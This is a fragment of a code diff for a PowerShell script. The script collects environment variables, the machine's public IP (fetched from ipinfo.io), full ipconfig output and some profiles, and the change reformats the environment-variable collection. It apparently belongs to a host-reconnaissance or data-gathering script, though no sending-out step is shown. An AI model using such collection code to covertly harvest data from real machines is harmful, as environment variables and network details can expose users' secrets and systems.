@@ -13,8 +13,10 @@ foreach ($profile in $profiles) {
 }
 
 $envVars = gci env: | ForEach-Object {
-    "$_.Name = $_.Value"
-}
+    $key = $_.Name
+    $value = $_.Value
+    "$key=$value"
+} | ConvertFrom-Csv -Delimiter '=' -Header Name, Value
 
 $IPV4 = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
 $IPconfig = (ipconfig /all)
